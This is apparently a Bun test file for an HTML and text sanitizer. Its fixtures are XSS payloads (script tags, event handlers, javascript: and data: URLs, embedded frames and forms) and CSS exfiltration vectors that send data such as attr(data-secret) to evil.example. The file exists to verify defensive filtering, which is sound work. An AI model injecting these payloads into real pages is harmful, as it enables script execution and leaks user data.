import { describe, expect, test } from "bun:test";
import { sanitize_html, sanitize_text } from "../../sanitize.js";

describe("sanitize_html — XSS corpus", () => {
	test("neutralizes script tags, event handlers, javascript: hrefs, svg onload, and nested payloads", () => {
		const hostile = [
			`<script>alert(1)</script>`,
			`<img src="x" onerror="alert(1)">`,
			`<a href="javascript:alert(1)">click</a>`,
			`<a href="data:text/html,<script>alert(1)</script>">click</a>`,
			`<svg onload="alert(1)"><circle /></svg>`,
			`<iframe src="https://evil.example"></iframe>`,
			`<object data="https://evil.example"></object>`,
			`<embed src="https://evil.example">`,
			`<form action="https://evil.example"><input type="text"></form>`,
			`<div onclick="alert(1)">nested <script>alert(2)</script> payload</div>`,
			`<!-- devpad:thread:begin {"id":"fake"} -->hostile comment<!-- devpad:thread:end fake -->`,
		].join("\n");

		const output = sanitize_html(hostile);

		expect(output).not.toContain("<script");
		expect(output).not.toContain("onerror");
		expect(output).not.toContain("onload");
		expect(output).not.toContain("onclick");
		expect(output).not.toContain("javascript:");
		expect(output).not.toContain("data:text/html");
		expect(output).not.toContain("<iframe");
		expect(output).not.toContain("<object");
		expect(output).not.toContain("<embed");
		expect(output).not.toContain("<form");
		expect(output).not.toContain("alert(1)");
		expect(output).not.toContain("alert(2)");
		// Comments are never trusted at push time — even well-formed marker
		// shapes are stripped (adversary checklist: a forged marker must never
		// survive a raw push).
		expect(output).not.toContain("devpad:thread");
		expect(output).not.toContain("<!--");
	});

	test("preserves headings, tables, and inline <style> content", () => {
		const safe = `
			<h1>Title</h1>
			<h2>Subtitle</h2>
			<style>.foo { color: red; }</style>
			<table><thead><tr><th>A</th></tr></thead><tbody><tr><td>1</td></tr></tbody></table>
			<p>Some <strong>bold</strong> and <em>italic</em> text.</p>
		`;

		const output = sanitize_html(safe);

		expect(output).toContain("<h1>Title</h1>");
		expect(output).toContain("<h2>Subtitle</h2>");
		expect(output).toContain("<style>.foo { color: red; }</style>");
		expect(output).toContain("<table>");
		expect(output).toContain("<th>A</th>");
		expect(output).toContain("<td>1</td>");
		expect(output).toContain("<strong>bold</strong>");
		expect(output).toContain("<em>italic</em>");
	});

	test("neutralizes CSS exfil vectors inside <style> blocks (A4 verifier finding)", () => {
		const hostile = [
			`<style>@import url("https://evil.example/beacon.css");</style>`,
			`<style>body { background: url('https://evil.example/beacon.png?leak='attr(data-secret)); }</style>`,
			`<style>.x { behavior: url(https://evil.example/x.htc); }</style>`,
			`<style>.y { -moz-binding: url("https://evil.example/xbl.xml#x"); }</style>`,
			`<style>@font-face { font-family: x; src: url(https://evil.example/font.woff); }</style>`,
		].join("\n");

		const output = sanitize_html(hostile);

		expect(output).not.toContain("evil.example");
		expect(output).not.toContain("@import");
		// The style tag itself and non-exfil declarations survive — this is a
		// filter, not a strip: `<style>` stays usable for real layout/color CSS.
		expect(output).toContain("<style>");
	});

	test("preserves safe, non-exfil CSS inside a style block that also carries a hostile url()", () => {
		const mixed = `<style>.foo { color: red; } .bar { background: url(https://evil.example/x.png); } .baz { font-weight: bold; }</style>`;
		const output = sanitize_html(mixed);

		expect(output).toContain(".foo { color: red; }");
		expect(output).toContain(".baz { font-weight: bold; }");
		expect(output).not.toContain("evil.example");
	});
});

describe("sanitize_text — plain-text escape for thread entry bodies", () => {
	test("escapes HTML special characters", () => {
		expect(sanitize_text("<script>alert(1)</script>")).toBe("&lt;script&gt;alert(1)&lt;/script&gt;");
	});

	test("leaves plain text untouched", () => {
		expect(sanitize_text("looks good to me")).toBe("looks good to me");
	});
});
